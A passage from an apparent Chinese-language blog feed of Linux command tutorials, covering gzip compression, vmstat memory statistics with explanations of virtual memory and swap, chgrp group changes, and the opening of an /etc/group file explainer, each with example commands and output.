-r log.tar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log.tar-rw-r--r-- 1 root root 307200 11-29 17:54 log.tar[root@localhost test]# gzip -r log.tar[root@localhost test]# ls -al log.tar.gz -rw-r--r-- 1 root root 1421 11-29 17:54 log.tar.gz 实例5L递归的压缩目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -rv test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# cd ..[root@localhost test]# gzip -rv test6test6/log2014.log: 0.0% -- replaced with test6/log2014.log.gztest6/linklog.log: 99.6% -- replaced with test6/linklog.log.gztest6/log2015.log: 0.0% -- replaced with test6/log2015.log.gztest6/log2013.log: 47.5% -- replaced with test6/log2013.log.gztest6/log2012.log: 99.6% -- replaced with test6/log2012.log.gztest6/log2017.log: 0.0% -- replaced with test6/log2017.log.gztest6/log2016.log: 0.0% -- replaced with test6/log2016.log.gz[root@localhost test]# cd test6[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，所有 test 下面的文件都变成了 .gz ，目录依然存在，只是目录里面的文件相应变成了 .gz 这就是压缩，和打包不同。因为是对目录操作，所以需要加上 -r 选项，这样也可以对子目录进行递归了。 实例6：递归地解压目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -dr test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz[root@localhost test6]# cd ..[root@localhost test]# gzip -dr test6[root@localhost test]# cd test6[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# 实例7：-&lt;数字&gt; 自定义压缩率&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -v -9 test.tar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# gzip -v -1 test.tartest.tar: 88.4% -- replaced with test.tar.gz[root@localhost test]# gzip -d test.tar.gz[root@localhost test]# gzip -v -9 test.tartest.tar: 89.7% -- replaced with test.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩等级，1压缩最差，9压缩最好，6为默认。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- vmstat]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F48.%20Linux%20%E5%91%BD%E4%BB%A4-%20vmstat%2F</url>
    <content type="text"><![CDATA[Linux 命令- vmstat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vmstat是Virtual Meomory Statistics（虚拟内存统计）的缩写，可对操作系统的虚拟内存、进程、CPU活动进行监控。他是对系统的整体情况进行统计，不足之处是无法对某个进程进行深入分析。vmstat 工具提供了一种低开销的系统性能观察方式。因为 vmstat 本身就是低开销工具，在非常高负荷的服务器上，你需要查看并监控系统的健康情况,在控制窗口还是能够使用vmstat 输出结果。在学习vmstat命令前，我们先了解一下Linux系统中关于物理内存和虚拟内存相关信息。 物理内存和虚拟内存区别：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们知道，直接从物理内存读写数据要比从硬盘读写数据要快的多，因此，我们希望所有数据的读取和写入都在内存完成，而内存是有限的，这样就引出了物理内存与虚拟内存的概念。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;物理内存就是系统硬件提供的内存大小，是真正的内存，相对于物理内存，在linux下还有一个虚拟内存的概念，虚拟内存就是为了满足物理内存的不足而提出的策略，它是利用磁盘空间虚拟出的一块逻辑内存，用作虚拟内存的磁盘空间被称为交换空间（Swap Space）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;作为物理内存的扩展，linux会在物理内存不足时，使用交换分区的虚拟内存，更详细的说，就是内核会将暂时不用的内存块信息写到交换空间，这样以来，物理内存得到了释放，这块内存就可以用于其它目的，当需要用到原始的内容时，这些信息会被重新从交换空间读入物理内存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux的内存管理采取的是分页存取机制，为了保证物理内存能得到充分的利用，内核会在适当的时候将物理内存中不经常使用的数据块自动交换到虚拟内存中，而将经常使用的信息保留到物理内存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要深入了解linux内存运行机制，需要知道下面提到的几个方面： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，Linux系统会不时的进行页面交换操作，以保持尽可能多的空闲物理内存，即使并没有什么事情需要内存，Linux也会交换出暂时不用的内存页面。这可以避免等待交换所需的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其次，linux进行页面交换是有条件的，不是所有页面在不用时都交换到虚拟内存，linux内核根据”最近最经常使用“算法，仅仅将一些不经常使用的页面文件交换到虚拟内存，有时我们会看到这么一个现象：linux物理内存还有很多，但是交换空间也使用了很多。其实，这并不奇怪，例如，一个占用很大内存的进程运行时，需要耗费很多内存资源，此时就会有一些不常用页面文件被交换到虚拟内存中，但后来这个占用很多内存资源的进程结束并释放了很多内存时，刚才被交换出去的页面文件并不会自动的交换进物理内存，除非有这个必要，那么此刻系统物理内存就会空闲很多，同时交换空间也在被使用，就出现了刚才所说的现象了。关于这点，不用担心什么，只要知道是怎么一回事就可以了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，交换空间的页面在使用时会首先被交换到物理内存，如果此时没有足够的物理内存来容纳这些页面，它们又会被马上交换出去，如此以来，虚拟内存中可能没有足够空间来存储这些交换页面，最终会导致linux出现假死机、服务异常等问题，linux虽然可以在一段时间内自行恢复，但是恢复后的系统已经基本不可用了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，合理规划和设计linux内存的使用，是非常重要的。 虚拟内存原理：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在系统中运行的每个进程都需要使用到内存，但不是每个进程都需要每时每刻使用系统分配的内存空间。当系统运行所需内存超过实际的物理内存，内核会释放某些进程所占用但未使用的部分或所有物理内存，将这部分资料存储在磁盘上直到进程下一次调用，并将释放出的内存提供给有需要的进程使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux内存管理中，主要是通过“调页Paging”和“交换Swapping”来完成上述的内存调度。调页算法是将内存中最近不常使用的页面换到磁盘上，把活动页面保留在内存中供进程使用。交换技术是将整个进程，而不是部分页面，全部交换到磁盘上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分页(Page)写入磁盘的过程被称作Page-Out，分页(Page)从磁盘重新回到内存的过程被称作Page-In。当内核需要一个分页时，但发现此分页不在物理内存中(因为已经被Page-Out了)，此时就发生了分页错误（Page Fault）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当系统内核发现可运行内存变少时，就会通过Page-Out来释放一部分物理内存。经管Page-Out不是经常发生，但是如果Page-out频繁不断的发生，直到当内核管理分页的时间超过运行程式的时间时，系统效能会急剧下降。这时的系统已经运行非常慢或进入暂停状态，这种状态亦被称作thrashing(颠簸)。 1．命令格式1234567vmstat [-a] [-n] [-S unit] [delay [ count]]vmstat [-s] [-n] [-S unit]vmstat [-m] [-n] [delay [ count]]vmstat [-d] [-n] [delay [ count]]vmstat [-p disk partition] [-n] [delay [ count]]vmstat [-f]vmstat [-V] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来显示虚拟内存的信息 3．命令参数 -a：显示活跃和非活跃内存 -f：显示从系统启动至今的fork数量 。 -m：显示slabinfo -n：只在开始时显示一次各字段名称。 -s：显示内存相关统计信息及多种系统活动数量。 delay：刷新时间间隔。如果不指定，只显示一条结果。 count：刷新次数。如果不指定刷新次数，但指定了刷新时间间隔，这时刷新次数为无穷。 -d：显示磁盘相关统计信息。 -p：显示指定磁盘分区统计信息 -S：使用指定单位显示。参数有 k 、K 、m 、M ，分别代表1000、1024、1000000、1048576字节（byte）。默认单位为K（1024 bytes） -V：显示vmstat版本信息。 4．使用实例实例1：显示虚拟内存使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# vmstat 5 6procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------ r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 3029876 199616 690980 0 0 0 2 3 2 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 41 1009 39 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 3 1004 36 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 4 1004 36 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 6 1003 33 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 5 1003 33 0 0 100 0 0 说明：字段说明：Procs（进程）： r: 运行队列中进程数量 b: 等待IO的进程数量 Memory（内存）： swpd: 使用虚拟内存大小 free: 可用内存大小 buff: 用作缓冲的内存大小 cache: 用作缓存的内存大小 Swap： si: 每秒从交换区写到内存的大小 so: 每秒写入交换区的内存大小 IO：（现在的Linux版本块的大小为1024bytes） bi: 每秒读取的块数 bo: 每秒写入的块数 系统： in: 每秒中断数，包括时钟中断。 cs: 每秒上下文切换数。 CPU（以百分比表示）： us: 用户进程执行时间(user time) sy: 系统进程执行时间(system time) id: 空闲时间(包括IO等待时间),中央处理器的空闲时间 。以百分比表示。 wa: 等待IO时间 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： 如果 r经常大于 4 ，且id经常少于40，表示cpu的负荷很重。如果bi，bo 长期不等于0，表示内存不足。如果disk 经常不等于0， 且在 b中的队列 大于3， 表示 io性能不好。Linux在具有高稳定性、可靠性的同时，具有很好的可伸缩性和扩展性，能够针对不同的应用和硬件环境调整，优化出满足当前应用需要的最佳性能。因此企业在维护Linux系统、进行系统调优时，了解系统性能分析工具是至关重要的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1vmstat 5 5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示在5秒时间内进行5次采样。将得到一个数据汇总他能够反映真正的系统情况。 实例2：显示活跃和非活跃内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -a 2 5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# vmstat -a 2 5procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------ r b swpd free inact active si so bi bo in cs us sy id wa st 0 0 0 3029752 387728 513008 0 0 0 2 3 2 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 0 1005 34 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 22 1004 36 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 0 1004 33 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 0 1003 32 0 0 100 0 0[root@localhost ~]# 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用-a选项显示活跃和非活跃内存时，所显示的内容除增加inact和active外，其他显示内容与例子1相同。 字段说明：Memory（内存）： inact: 非活跃内存大小（当使用-a选项时显示） active: 活跃的内存大小（当使用-a选项时显示） 实例3：查看系统已经fork了多少次&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -f &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@SCF1129 ~]# vmstat -f 12744849 forks[root@SCF1129 ~]# 说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数据是从/proc/stat中的processes字段里取得的 实例4：查看内存使用的详细信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost ~]# vmstat -s 4043760 total memory 1013884 used memory 513012 active memory 387728 inactive memory 3029876 free memory 199616 buffer memory 690980 swap cache 6096656 total swap 0 used swap 6096656 free swap 83587 non-nice user cpu ticks 132 nice user cpu ticks 278599 system cpu ticks 913344692 idle cpu ticks 814550 IO-wait cpu ticks 10547 IRQ cpu ticks 21261 softirq cpu ticks 0 stolen cpu ticks 310215 pages paged in 14254652 pages paged out 0 pages swapped in 0 pages swapped out 288374745 interrupts 146680577 CPU context switches 1351868832 boot time 367291 forks 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些信息的分别来自于/proc/meminfo,/proc/stat和/proc/vmstat。 实例5：查看磁盘的读/写&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324[root@localhost ~]# vmstat -ddisk- ------------reads------------ ------------writes----------- -----IO------ total merged sectors ms total merged sectors ms cur secram0 0 0 0 0 0 0 0 0 0 0ram1 0 0 0 0 0 0 0 0 0 0ram2 0 0 0 0 0 0 0 0 0 0ram3 0 0 0 0 0 0 0 0 0 0ram4 0 0 0 0 0 0 0 0 0 0ram5 0 0 0 0 0 0 0 0 0 0ram6 0 0 0 0 0 0 0 0 0 0ram7 0 0 0 0 0 0 0 0 0 0ram8 0 0 0 0 0 0 0 0 0 0ram9 0 0 0 0 0 0 0 0 0 0ram10 0 0 0 0 0 0 0 0 0 0ram11 0 0 0 0 0 0 0 0 0 0ram12 0 0 0 0 0 0 0 0 0 0ram13 0 0 0 0 0 0 0 0 0 0ram14 0 0 0 0 0 0 0 0 0 0ram15 0 0 0 0 0 0 0 0 0 0sda 33381 6455 615407 63224 2068111 1495416 28508288 15990289 0 10491hdc 0 0 0 0 0 0 0 0 0 0fd0 0 0 0 0 0 0 0 0 0 0md0 0 0 0 0 0 0 0 0 0 0[root@localhost ~]# 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些信息主要来自于/proc/diskstats. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;merged:表示一次来自于合并的写/读请求,一般系统会把多个连接/邻近的读/写请求合并到一起来操作. 实例6：查看/dev/sda1磁盘的读/写&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -p /dev/sda1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@SCF1129 ~]# df文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda3 1119336548 27642068 1034835500 3% /tmpfs 32978376 0 32978376 0% /dev/shm/dev/sda1 1032088 59604 920056 7% /boot[root@SCF1129 ~]# vmstat -p /dev/sda1sda1 reads read sectors writes requested writes 18607 4249978 6 48[root@SCF1129 ~]# vmstat -p /dev/sda3sda3 reads read sectors writes requested writes 429350 35176268 28998789 980301488[root@SCF1129 ~]# 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些信息主要来自于/proc/diskstats。 reads:来自于这个分区的读的次数。 read sectors:来自于这个分区的读扇区的次数。 writes:来自于这个分区的写的次数。 requested writes:来自于这个分区的写请求次数。 实例7：查看系统的slab信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143[root@localhost ~]# vmstat -mCache Num Total Size Pagesip_conntrack_expect 0 0 136 28ip_conntrack 3 13 304 13ip_fib_alias 11 59 64 59ip_fib_hash 11 59 64 59AF_VMCI 0 0 960 4bio_map_info 100 105 1064 7dm_mpath 0 0 1064 7jbd_4k 0 0 4096 1dm_uevent 0 0 2608 3dm_tio 0 0 24 144dm_io 0 0 48 77scsi_cmd_cache 10 10 384 10sgpool-128 32 32 4096 1sgpool-64 32 32 2048 2sgpool-32 32 32 1024 4sgpool-16 32 32 512 8sgpool-8 45 45 256 15scsi_io_context 0 0 112 34ext3_inode_cache 51080 51105 760 5ext3_xattr 36 88 88 44journal_handle 18 144 24 144journal_head 56 80 96 40revoke_table 4 202 16 202revoke_record 0 0 32 112uhci_urb_priv 0 0 56 67UNIX 13 33 704 11flow_cache 0 0 128 30msi_cache 33 59 64 59cfq_ioc_pool 14 90 128 30cfq_pool 12 90 216 18crq_pool 16 96 80 48deadline_drq 0 0 80 48as_arq 0 0 96 40mqueue_inode_cache 1 4 896 4isofs_inode_cache 0 0 608 6hugetlbfs_inode_cache 1 7 576 7Cache Num Total Size Pagesext2_inode_cache 0 0 720 5ext2_xattr 0 0 88 44dnotify_cache 0 0 40 92dquot 0 0 256 15eventpoll_pwq 3 53 72 53eventpoll_epi 3 20 192 20inotify_event_cache 0 0 40 92inotify_watch_cache 1 53 72 53kioctx 0 0 320 12kiocb 0 0 256 15fasync_cache 0 0 24 144shmem_inode_cache 254 290 768 5posix_timers_cache 0 0 128 30uid_cache 0 0 128 30ip_mrt_cache 0 0 128 30tcp_bind_bucket 3 112 32 112inet_peer_cache 0 0 128 30secpath_cache 0 0 64 59xfrm_dst_cache 0 0 384 10ip_dst_cache 5 10 384 10arp_cache 1 15 256 15RAW 3 5 768 5UDP 5 10 768 5tw_sock_TCP 0 0 192 20request_sock_TCP 0 0 128 30TCP 4 5 1600 5blkdev_ioc 14 118 64 59blkdev_queue 20 30 1576 5blkdev_requests 13 42 272 14biovec-256 7 7 4096 1biovec-128 7 8 2048 2biovec-64 7 8 1024 4biovec-16 7 15 256 15biovec-4 7 59 64 59biovec-1 23 202 16 202bio 270 270 128 30utrace_engine_cache 0 0 64 59Cache Num Total Size Pagesutrace_cache 0 0 64 59sock_inode_cache 33 48 640 6skbuff_fclone_cache 7 7 512 7skbuff_head_cache 319 390 256 15file_lock_cache 1 22 176 22Acpi-Operand 4136 4248 64 59Acpi-ParseExt 0 0 64 59Acpi-Parse 0 0 40 92Acpi-State 0 0 80 48Acpi-Namespace 2871 2912 32 112delayacct_cache 81 295 64 59taskstats_cache 4 53 72 53proc_inode_cache 1427 1440 592 6sigqueue 0 0 160 24radix_tree_node 13166 13188 536 7bdev_cache 23 24 832 4sysfs_dir_cache 5370 5412 88 44mnt_cache 26 30 256 15inode_cache 2009 2009 560 7dentry_cache 60952 61020 216 18filp 479 1305 256 15names_cache 3 3 4096 1avc_node 14 53 72 53selinux_inode_security 994 1200 80 48key_jar 2 20 192 20idr_layer_cache 74 77 528 7buffer_head 164045 164800 96 40mm_struct 51 56 896 4vm_area_struct 1142 1958 176 22fs_cache 35 177 64 59files_cache 36 55 768 5signal_cache 72 162 832 9sighand_cache 68 84 2112 3task_struct 76 80 1888 2anon_vma 458 864 24 144pid 83 295 64 59shared_policy_node 0 0 48 77Cache Num Total Size Pagesnuma_policy 37 144 24 144size-131072(DMA) 0 0 131072 1size-131072 0 0 131072 1size-65536(DMA) 0 0 65536 1size-65536 1 1 65536 1size-32768(DMA) 0 0 32768 1size-32768 2 2 32768 1size-16384(DMA) 0 0 16384 1size-16384 5 5 16384 1size-8192(DMA) 0 0 8192 1size-8192 7 7 8192 1size-4096(DMA) 0 0 4096 1size-4096 110 111 4096 1size-2048(DMA) 0 0 2048 2size-2048 602 602 2048 2size-1024(DMA) 0 0 1024 4size-1024 344 352 1024 4size-512(DMA) 0 0 512 8size-512 433 480 512 8size-256(DMA) 0 0 256 15size-256 1139 1155 256 15size-128(DMA) 0 0 128 30size-64(DMA) 0 0 64 59size-64 5639 5782 64 59size-32(DMA) 0 0 32 112size-128 801 930 128 30size-32 3005 3024 32 112kmem_cache 137 137 2688 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这组信息来自于/proc/slabinfo。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slab:由于内核会有许多小对象，这些对象构造销毁十分频繁，比如i-node，dentry，这些对象如果每次构建的时候就向内存要一个页(4kb)，而其实只有几个字节，这样就会非常浪费，为了解决这个问题，就引入了一种新的机制来处理在同一个页框中如何分配小存储区，而slab可以对小对象进行分配,这样就不用为每一个对象分配页框，从而节省了空间，内核对一些小对象创建析构很频繁，slab对这些小对象进行缓冲,可以重复利用,减少内存分配次数。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- chgrp]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F29.%20Linux%20%E5%91%BD%E4%BB%A4-%20chgrp%2F</url>
    <content type="text"><![CDATA[Linux 命令- chgrp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 Linux 系统里，文件或目录的权限的掌控以拥有者及所属群组来管理。可以使用 chgrp 指令变更文件与目录所属群组，这种方式采用群组名称或群组织识别码都可以。chgrp 命令就是 change group 的缩写！要被改变的组名必须要在 /etc/group 文件被存在才行。 1.命令格式1chgrp [选项] [组] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chgrp 命令可采用群组名称或群组织识别码的方式改变文件或目录的所属群组。使用权限是超级用户。 3.命令参数必要参数 -c 当发生改变时输出调试信息 -f 不显示错误信息 -R 处理指定目录以及其子目录下的所有文件 -v 运行时显示详细的处理信息 –dereference 作用于符号链接的指向，而不是符号链接本身 –no-dereference 作用于符号链接本身 选择参数 –reference=&lt;文件或者目录&gt; –help 显示帮助信息 –version 显示版本信息 使用实例实例1：改变文件的群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp -v bin log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# ll---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chgrp -v bin log2012.log“log2012.log” 的所属组已更改为 bin[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将 log2012.log 文件由 root 群组该为 bin 群组 实例2：根据指定未见改变文件的群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp --reference=log2012.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log[root@localhost test]# chgrp --reference=log2012.log log2013.log [root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改变文件 log2013.log 的群组属性，是的文件 log2013.log 的群组属性和参考文件 log2012.log 的群组属性相同 实例3.改变指定目录以及其子目录下的所有文件的群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp -R bin test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test]# lldrwxr-xr-x 2 root root 4096 11-30 08:39 test6[root@localhost test]# cd test6[root@localhost test6]# ll---xr--r-- 1 root root 302108 11-30 08:39 linklog.log---xr--r-- 1 root root 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root root 61 11-30 08:39 log2013.log-rw-r--r-- 1 root root 0 11-30 08:39 log2014.log-rw-r--r-- 1 root root 0 11-30 08:39 log2015.log-rw-r--r-- 1 root root 0 11-30 08:39 log2016.log-rw-r--r-- 1 root root 0 11-30 08:39 log2017.log[root@localhost test6]# cd ..[root@localhost test]# chgrp -R bin test6[root@localhost test]# cd test6[root@localhost test6]# ll---xr--r-- 1 root bin 302108 11-30 08:39 linklog.log---xr--r-- 1 root bin 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root bin 61 11-30 08:39 log2013.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2014.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2015.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2016.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2017.log[root@localhost test6]# cd ..[root@localhost test]# lldrwxr-xr-x 2 root bin 4096 11-30 08:39 test6[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改变指定目录以及其子目录下的所有文件的群组属性 实例4.通过群组织识别码改变文件群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp -R 100 test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# chgrp -R 100 test6[root@localhost test]# lldrwxr-xr-x 2 root users 4096 11-30 08:39 test6[root@localhost test]# cd test6[root@localhost test6]# ll---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过群识别码改变文件群组属性，100为 users 群组的识别码，具体群组和群组识别码可以去 /etc/group 文件中查看]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[/etc/group 文件详解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F31.%20group%20%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[/etc/group 文件详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux /etc/group文件与/etc/passwd和/etc/shadow文件都是有关于系统管理员对用户和用户组管理时相关的文件。linux /etc/group文件是有关于系统管理员对用户和用户组管理的文件,linux用户组的所有信息都存放在/etc/group文件中。具有某种共同特征的用户集合起来就是用户组（Group）。用户组（Group）配置文件主要有 /etc/group和/etc/gshadow，其中/etc/gshadow是/etc/group的加密信息文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将用户分组是Linux系统中对用户进行管理及控制访问权限的一种手段。每个用户都属于某个用户组；一个组中可以有多个用户，一个用户也可以属于不 同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是用户所属的主组，也就是登录时所属的默认组，而其他组称为附加组。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户组的所有信息都存放在/etc/group文件中。此文件的格式是由冒号(:)隔开若干个字段，这些字段具体如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组名:口令:组标识号:组内用户列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体解释： 组名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组名是用户组的名称，有字母或数字构成。与 /etc/passwd 中的登录名一样，组名不应重复 口令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;口令字段存放在用户组加密后的口令字。一般 Linux 系统的用户组都没有口令，即这个字段一般为空，或者是 * 。 组标识号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组标识号与用户标识号类似，也是一个证书，被系统内部用来标识组。别称 GID 。 组内用户列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是属于这个组的所有用户的列表，不同用户之间用逗号（，）分隔。这个用户组可能是用户的主组，也可能是附加组。 使用实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# cat 